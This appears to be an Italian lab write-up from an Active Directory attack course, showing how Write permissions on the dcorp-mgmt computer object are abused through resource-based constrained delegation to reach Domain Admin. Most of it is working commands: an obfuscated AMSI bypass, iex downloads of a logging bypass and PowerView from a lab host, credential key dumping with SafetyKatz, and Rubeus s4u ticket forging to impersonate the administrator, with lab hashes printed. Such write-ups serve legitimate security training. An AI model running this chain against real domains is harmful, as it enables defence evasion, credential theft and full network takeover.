# LEARNING OBJECTIVE17

<figure><img src="../.gitbook/assets/image (14) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

1. Find a computer object in dcorp domain where we have Write\
   permissions
2. Abuse the Write permissions to access that computer as Domain Admin.

### SVOLGIMENTO 1

Utilizziamo PowerView da una sessione PowerShell avviata con Invisi-Shell per enumerare i permessi di scrittura per un utente che abbiamo compromesso. Dopo aver provato con più utenti o utilizzando BloodHound, sapremmo che l'utente ciadmin dispone dei permessi di scrittura sull'oggetto computer di dcorp-mgmt:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
. C:\AD\Tools\PowerView.ps1
```

```powershell
 Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'ciadmin'}
```

<figure><img src="../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Rieseguiamo la revshell tramite jenkins buildstep, il server e' sermpre su 172.16.3.11:8080, usare builduser:builduser per il login, e poi selezionare un progetto, configurarlo e inserire il payolad del buildsteps&#x20;

```
PAYLOAD DA INSERIRE NEL BUILDSTEP DEL PROGETTO JENKINS

```

<figure><img src="../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

Dopo aver riottenuto la revshell possiamo caricare PowerView, prima eseguiamo sblogging e ANSI bypass

```powershell
iex (iwr http://172.16.100.60/sbloggingbypass.txt -UseBasicParsing)
```

```powershell
 S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

A questo punto possiamo importare PowerView

```powershell
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.60/PowerView.ps1'))
```

ed eseguire <kbd>Set-DomainRBCD</kbd> per accedere <kbd>dcorp-mgmt</kbd> come <kbd>dcorp-student460$</kbd>

```powershell
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std460$' -Verbose
```

<figure><img src="../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

Verifichiamo l'avvenuta esecuzione usando <kbd>Get-DomainRBCD</kbd>

```powershell
Get-DomainRBCD
```

<figure><img src="../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Ottieni le chiavi AES della tua VM studente (come abbiamo configurato RBCD sopra). Esegui il comando seguente da una shell con privilegi elevati:

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

<figure><img src="../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Chiavi host dcorp-std460$

**aes256\_hmac** 5e7490920e19596ab804ef53cc511e9aa5c67cc22a2f987eb56f6a1cacf3165f **rc4\_hmac\_nt** 4e934efc33c204fe4e28745ebfedc2c6&#x20;

**rc4\_hmac\_old** 4e934efc33c204fe4e28745ebfedc2c6&#x20;

**rc4\_md4** 4e934efc33c204fe4e28745ebfedc2c6&#x20;

**rc4\_hmac\_nt\_exp** 4e934efc33c204fe4e28745ebfedc2c6 **rc4\_hmac\_old\_exp** 4e934efc33c204fe4e28745ebfedc2c6

Con Rubeus, abusare dell'RBCD per accedere a dcorp-mgmt come amministratore di dominio

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std460$ /aes256:5e7490920e19596ab804ef53cc511e9aa5c67cc22a2f987eb56f6a1cacf3165f /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
```

<figure><img src="../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Verifichiamo se accediamo dcorp-mgmt

```powershell
winrs -r:dcorp-mgmt cmd
```

```powershell
set username
```

```powershell
set computername
```

<figure><img src="../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
